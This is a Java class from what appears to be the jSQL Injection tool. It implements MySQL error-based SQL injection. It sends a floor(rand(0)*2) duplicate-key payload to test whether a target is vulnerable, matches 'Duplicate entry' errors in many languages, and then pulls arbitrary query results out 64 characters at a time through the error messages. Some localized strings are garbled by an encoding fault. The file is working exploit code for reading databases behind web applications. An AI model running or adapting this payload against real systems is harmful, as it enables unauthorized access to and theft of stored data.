package com.jsql.model.pattern.strategy;

import org.apache.log4j.Logger;

import com.jsql.exception.StoppableException;
import com.jsql.model.AbstractSuspendable;
import com.jsql.model.bean.Request;
import com.jsql.view.MediatorGUI;

/**
 * Injection strategy using error attack.
 */
public class StrategyErrorbased extends AbstractStrategyInjection {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(StrategyErrorbased.class);

    @Override
    public void checkApplicability() {
        LOGGER.info("Error based test...");
        
        String performanceSourcePage = MediatorGUI.model().inject(
            MediatorGUI.model().insertionCharacter + "+and(" +
                "select+1+" +
                "from(" +
                    "select+" +
                        "count(*)," +
                        "floor(rand(0)*2)" +
                    "from+" +
                        "information_schema.tables+" +
                    "group+by+2" +
                ")a" +
            ")--+"
        );

        isApplicable = 
                    performanceSourcePage.indexOf("Duplicate entry '1' for key ") != -1
                 || performanceSourcePage.indexOf("Like verdier '1' for ") != -1
                 || performanceSourcePage.indexOf("Like verdiar '1' for ") != -1
                 || performanceSourcePage.indexOf("Kattuv v��rtus '1' v�tmele ") != -1
                 || performanceSourcePage.indexOf("Opakovan� k��� '1' (��slo k���a ") != -1
                 || performanceSourcePage.indexOf("pienie '1' dla klucza ") != -1
                 || performanceSourcePage.indexOf("Duplikalt bejegyzes '1' a ") != -1
                 || performanceSourcePage.indexOf("Ens v�rdier '1' for indeks ") != -1
                 || performanceSourcePage.indexOf("Dubbel nyckel '1' f�r nyckel ") != -1
                 || performanceSourcePage.indexOf("kl�� '1' (��slo kl��e ") != -1
                 || performanceSourcePage.indexOf("Duplicata du champ '1' pour la clef ") != -1
                 || performanceSourcePage.indexOf("Entrada duplicada '1' para la clave ") != -1
                 || performanceSourcePage.indexOf("Cimpul '1' e duplicat pentru cheia ") != -1
                 || performanceSourcePage.indexOf("Dubbele ingang '1' voor zoeksleutel ") != -1
                 || performanceSourcePage.indexOf("Valore duplicato '1' per la chiave ") != -1
                 /*jp missing*/
                 /*kr grk ukr rss missing*/
                 || performanceSourcePage.indexOf("Dupliran unos '1' za klju") != -1
                 || performanceSourcePage.indexOf("Entrada '1' duplicada para a chave ") != -1;
        
        if (this.isApplicable) {
            activate();
        } else {
            deactivate();
        }
    }

    @Override
    public void activate() {
        Request request = new Request();
        request.setMessage("MarkErrorbasedVulnerable");
        MediatorGUI.model().interact(request);
    }

    @Override
    public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkErrorbasedInvulnerable");
        MediatorGUI.model().interact(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable) throws StoppableException {
        return MediatorGUI.model().inject(
                MediatorGUI.model().insertionCharacter + "+and" +
                    "(" +
                        "select+" +
                            "1+" +
                        "from(" +
                            "select+" +
                                "count(*)," +
                                "concat(" +
                                    "0x53514c69," +
                                    "mid(" +
                                        "(" + sqlQuery + ")," +
                                        startPosition + "," +
                                        "64" +
                                    ")," +
                                "floor(rand(0)*2)" +
                            ")" +
                            "from+information_schema.tables+" +
                            "group+by+2" +
                        ")a" +
                    ")--+");
    }

    @Override
    public void applyStrategy() {
        LOGGER.info("Using error based injection...");
        MediatorGUI.model().applyStrategy(this);
        
        Request request = new Request();
        request.setMessage("MarkErrorbasedStrategy");
        MediatorGUI.model().interact(request);
    }
}